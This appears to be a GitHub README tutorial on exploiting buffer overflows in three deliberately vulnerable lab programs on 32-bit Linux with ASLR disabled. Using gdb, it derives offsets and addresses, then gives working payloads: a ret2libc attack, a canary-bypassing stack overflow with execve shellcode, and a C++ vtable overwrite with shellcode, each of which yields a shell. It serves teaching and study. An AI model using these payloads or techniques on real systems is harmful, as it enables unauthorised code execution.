# buffer-overflow
This is an in depth exploration of buffer overflow attacks in vulnerable C/C++ programs. All programs are run in a 32-bit machine with Debian GNU/Linux 7.8. It's important to note that [Address space layout randomization](http://en.wikipedia.org/wiki/Address_space_layout_randomization) is disabled. Finally the programs are compiled with different options-flags that enable different protections. (wll become clear in the following).
___
#### [convert](https://github.com/igavriil/buffer-overflow/blob/master/convert.c) C program
###### Determine protections enabled
* Canaries between buffers and control data in the stack
```
$ gdb convert
(gdb) disas main
   Dump of assembler code for function main:
   0x0804869c <+0>:	push   %ebp
   .........  ....: ....   ....
   .........  ....: ....   ....
```
`.........  ....: call 0x80484c0 <__stack_chk_fail@plt>` in the procedure epilogue indicates the presence of a canary, but in this case this mechanism wasn't enabled.
* Executable Stack Protection
```
$ readelf -l convert
Elf file type is EXEC (Executable file)
Entry point 0x80485b0
There are 8 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
  ....           ......   ......     ......     ......  ......  . . ...
```
`GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4` this line indicated that the Stack is Read-Write but not executable, so we have one defensive mechanism to bypass.

###### Determine the size of the buffer to override the instruction pointer `$eip`
This is the line which can be used for overflowing the `date` buffer:
```
strcpy(date, argv[2]);
```
Let's explore the memory!
```
$ gdb convert
(gdb) run 1 $(perl -e 'print "A"x744 . "B"x4 . "C"x4 . "D"x4')
Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
(gdb) info registers
    eax            0x0	0
    ecx            0xbfffef78	-1073746056
    edx            0xb7fd3360	-1208143008
    ebx            0x41414141	1094795585
    esp            0xbffff2c0	0xbffff2c0
    ebp            0x43434343	0x43434343
    esi            0x0	0
    edi            0x42424242	1111638594
    eip            0x44444444	0x44444444
    eflags         0x10296	[ PF AF SF IF RF ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
```
So the size of the buffer to overwrite the `$eip` is 756.
###### Sketch memory layout and attack plan
<img src="https://raw.githubusercontent.com/igavriil/buffer-overflow/master/convert_attact.png" width="500" height="360"/>

###### Find the addresses needed for the attack
``` 
$ gdb convert
(gdb) break main
(gdb) run
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7eadc30 <system>
```
**system() address**: `0xb7eadc30`
```
(gdb) find &system,+9999999,"/bin/sh"  
0xb7fae194
```
**'/bin/sh' address**: `0xb7fae194`
```
(gdb) print exit
$1 = {<text variable, no debug info>} 0xb7ea1270 <exit>
```
**exit() address**: `0xb7ea1270`
###### Create your inputs according to the sketch and run the programm
```
$ ./convert 1 $(perl -e 'print "\x90"x752 .  "\x30\xdc\xea\xb7"  . "\x70\x12\xea\xb7" . "\x94\xe1\xfa\xb7"')
$ (unlocked shell)
```
___
#### [arpsender](https://github.com/igavriil/buffer-overflow/blob/master/arpsender.c) C program
###### Determine protections enabled
* Canaries between buffers and control data in the stack
```
$ gdb convert
(gdb) disas main
   Dump of assembler code for function main:
   0x08048793 <+0>:    	push   %ebp
   .........  ....:     ....   ....
   .........  ....:     ....   ....
   0x080488e6 <+339>:	call   0x80484c0 <__stack_chk_fail@plt>
   0x080488eb <+344>:	leave  
   0x080488ec <+345>:	ret
```
`.........  ....: call 0x80484c0 <__stack_chk_fail@plt>` in the procedure epilogue indicates the presence of a canary. So we have one defensive mechanism to bypass.
* Executable Stack Protection
```
$ readelf -l convert
Elf file type is EXEC (Executable file)
Entry point 0x8048550
There are 8 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
  ....           ......   ......     ......     ......  ......  . . ...
```
`GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE  0x4` this line indicated that the Stack is Read-Write and executable, so this defensive mechanism is disabled.

###### Determine the strategy to overwrite the `$eip` pointer
This are the lines/variables that will be used to exploit the program:
```
memcpy(hwaddr.addr, packet + ADDR_OFFSET, hwaddr.len);
memcpy(hwaddr.hwtype, packet, 4);

```
Let's explore the memory!

```
(gdb) break print_address
(gdb) run packet.txt
(gdb) x/x &i
0xbffff454:	0x0804834c
(gdb) x/x &hwaddr.len
0xbffff458:	0xb7ee25d0
(gdb) x/x &hwaddr.addr
0xbffff459:	0xf3b7ee25
(gdb) x/x &hwaddr.hwtype
0xbffff4dc:	0x00000000
(gdb) x/x &hwaddr.prototype
0xbffff4e0:	0xbffff598
(gdb) x/x &hwaddr.oper
0xbffff4e4:	0xb7ff59c0
(gdb) x/x &hwaddr.protolen
0xbffff4e8:	0x00000065
(gdb) info frame
Stack level 0, frame at 0xbffff500:
 eip = 0x804864e in print_address (arpsender.c:24); saved eip 0x80488c5
 called by frame at 0xbffff5a0
 source language c.
 Arglist at 0xbffff4f8, args: packet=0x804a008 "\324ò\241\002"
 Locals at 0xbffff4f8, Previous frame's sp is 0xbffff500
 Saved registers:
  ebp at 0xbffff4f8, eip at 0xbffff4fc
```
###### Sketch memory layout
<img src="https://raw.githubusercontent.com/igavriil/buffer-overflow/master/arpsender_sketch.png" width="300" height="440"/>
###### Deeper understand of memory and attack plan
* The distance between `char hwaddr.addr[128]` and `char* hwaddr.hwtype` is `131 bytes`(due to big endian convention)  so we need `135 bytes` overflow on `hwaddr.addr[128]` to overwrite the `4 bytes` of the pointer.
* The `$eip` pointer is located at `0xbffff4fc` under gdb environment.

___
* Overflow `hwaddr.addr[128]` buffer with `135 bytes` having the last `4 bytes` store the address of `$eip` pointer. In other words make the pointer `hwaddr.hwtype` pointer to point at the `$eip`.
* Then using the expression `memcpy(hwaddr.hwtype, packet, 4);` we are writing at the `$eip` pointer. So the variable `packet` should start with an address that points to a location of the memory where the beggining of the shellcode is stored or (better) at a location where a preceding to the shellcode `NOP(\x90)` is stored. 

___
Let us recall some crusial code to determine the form of the input:
```
  hwaddr.len = (shsize_t) *(packet + ADDR_LENGTH_OFFSET);
  memcpy(hwaddr.addr, packet + ADDR_OFFSET, hwaddr.len);
  memcpy(hwaddr.hwtype, packet, 4);
```
* The number of bytes to be copied to `hwaddr.addr` from the `packet` is determined by the `hwaddr.len` variable. This variable is read from `*(packet + ADD_LENGTH_OFFSET) -> *(packet + 4)` so the 5th byte of the input `packet`.
So in the 5th byte of the input `packet`, the number `135` should be placed, or in HEX `\x87`.
* The bytes to be copied to `hwaddr.addr` from the packet are read from `packet + ADDR_OFFSET -> packet + 8` so we need to place our shell code from that place and after.

###### Sketch attack plan
<img src="https://github.com/igavriil/buffer-overflow/blob/master/arpsender_attack.png" width="650" height="200"/>
###### Create your inputs according to the sketch and run the programm
```
perl -e 'print "\x69\xf4\xff\xbf\x87" ."\x90\x90\x90" . "\x90" x86 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"."\xfc\xf4\xff\xbf"' >packet.txt
```

```
$ ./arpsender packet.txt
...
*** stack smashing detected ***: ./arpsender terminated
...
```
Something has changed in the memory layout but we know that we are writing the canary value. Let's try to increment the addresses `16 bytes = 10(hex)` to pass the cannary and hopefully reach the `$eip`:
```
0xbffff4fc -> 0xbffff50c
0xbffff469 -> 0xbffff479
```
Rewrite the `packet.txt` with the shifted addresses
```
perl -e 'print "\x79\xf4\xff\xbf\x87" ."\x90\x90\x90" . "\x90" x86 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"."\x0c\xf5\xff\xbf"' >packet.txt
```

```
$ ./arpsender packet.txt
$ (unlocked shell)
```
___
#### [zoo](https://github.com/igavriil/buffer-overflow/blob/master/zoo.cpp) C++program
###### Determine protections enabled

Using the methods described in the previous programs we conclude that neither of the previously mensioned defence mechanism are enabled for this program, so we dive right away to our attack.

###### Determine strategy for attack
As we notice in the code the are to classes `Cow` and `Fox` that both inherit from the base class `Animal`. This base class is pretty simple: it has only one attribute, called `name` which is a char array of length 256. Also there are three methods: the two are getting and setting the `name` attribute and the third one which is virtual, the `speak` method.
There are two interesting things in the base class enabling a succesfull attack:
* The method `set_name` to assign a name to the animal uses the function `strcpy` to copy a buffer to the `name` attribute. This is obliously the place to overflow the `name` buffer.
* The method `speak` is virtual, which is enough reason to consider using it for the attack. A virtual method is assigned to an object at run time. This means that when the objects are created a dynamic binding is created to calculate the address from where the function will be called.

###### Exploring and sketching the memory
Let's jump into our - familiar by now - gdb environment

```
(gdb) disas main
Dump of assembler code for function main(int, char**):
   0x08048941 <+0>:	push   %ebp
   .......... ....      ...    ...
   0x08048971 <+48>:	mov    %eax,%ebx
   0x08048973 <+50>:	mov    %ebx,(%esp)
   0x08048976 <+53>:	call   0x8048b4a <Cow::Cow()>
   0x0804897b <+58>:	mov    %ebx,0x18(%esp)
   .......... ....      ...    ...
   0x0804898b <+74>:	mov    %eax,%ebx
   0x0804898d <+76>:	mov    %ebx,(%esp)
   0x08048990 <+79>:	call   0x8048b66 <Fox::Fox()>
   0x08048995 <+84>:	mov    %ebx,0x14(%esp)
   .......... ....      ...    ...
   0x08048a0b <+202>:	mov    $0x1,%eax
   .......... ....      ...    ...
   0x08048aa2 <+353>:	leave  
   0x08048aa3 <+354>:	ret  


(gdb) b *0x08048976
Breakpoint 1 at 0x8048976: file zoo.cpp, line 83.
(gdb) b *0x08048990
Breakpoint 2 at 0x8048990: file zoo.cpp, line 84.
(gdb) b *0x08048a0b
Breakpoint 3 at 0x8048a0b: file zoo.cpp, line 102.
(gdb) run -c 'a' -f 'b' -s 'a' -h 1
Starting program: /home/masteruser/zoo -c 'a' -f 'b' -s 'a' -h 1

Breakpoint 1, 0x08048976 in main (argc=9, argv=0xbffff624) at zoo.cpp:83
83	  a1 = new Cow;
(gdb) i r eax ebx
eax            0x804a008	134520840
ebx            0x804a008	134520840
(gdb) c
Continuing.

Breakpoint 2, 0x08048990 in main (argc=9, argv=0xbffff624) at zoo.cpp:84
84	  a2 = new Fox;
(gdb) i r eax ebx
eax            0x804a110	134521104
ebx            0x804a110	134521104
```
___
Let's look in a more traditional way and follow the links

```
(gdb) run -f $(perl -e 'print "AAAA"."BBBB"."C"x244 . "XXXX"') -c $(perl -e 'print "DDDD"."EEEE"."X"x244 . "FFFF"') -s 1

(gdb) break main
(gdb) p &a2
$1 = (Animal **) 0xbffff384
(gdb) p a2
$2 = (Animal *) 0x804a110
(gdb) x/x 0x804a110
0x804a110:	0x08048d10
(gdb) x/w 0x08048d10
0x8048d10 <_ZTV3Fox+8>:	0x080488a0
(gdb) x/w 0x080488a0
0x80488a0 <Fox::speak()>:	0x83e58955
(gdb) p &a1
$3 = (Animal **) 0xbffff388
(gdb) p a1
$4 = (Animal *) 0x804a008
(gdb) x/x 0x804a008
0x804a008:	0x08048d20
(gdb) x/w 0x08048d20
0x8048d20 <_ZTV3Cow+8>:	0x0804886c
(gdb) x/w 0x0804886c
0x804886c <Cow::speak()>:	0x83e58955

(gdb) x/68x 0x804a110
0x804a110:	0x08048d10	0x41414141	0x42424242	0x43434343
0x804a120:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a130:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a140:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a150:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a160:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a170:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a180:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a190:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a1a0:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a1b0:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a1c0:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a1d0:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a1e0:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a1f0:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a200:	0x43434343	0x43434343	0x43434343	0x43434343
0x804a210:	0x58585858	0x00020d00	0x00000000	0x00000000

(gdb) x/68x 0x804a008
0x804a008:	0x08048d20	0x44444444	0x45454545	0x58585858
0x804a018:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a028:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a038:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a048:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a058:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a068:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a078:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a088:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a098:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a0a8:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a0b8:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a0c8:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a0d8:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a0e8:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a0f8:	0x58585858	0x58585858	0x58585858	0x58585858
0x804a108:	0x46464646	0x00000100	0x08048d10	0x41414141
```
So now we can sketch the memory:
<img src="https://raw.githubusercontent.com/igavriil/buffer-overflow/master/master.png" width="500" height="450"/>

###### Preparing the attacks
<img src="https://raw.githubusercontent.com/igavriil/buffer-overflow/master/master_attack.png" width="500" height="360"/>



```
./zoo -f bob -c $(perl -e print'"\x70\xa0\x04\x08" . "\x90"x211 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x0c\xa0\x04\x08"') -s 1
```

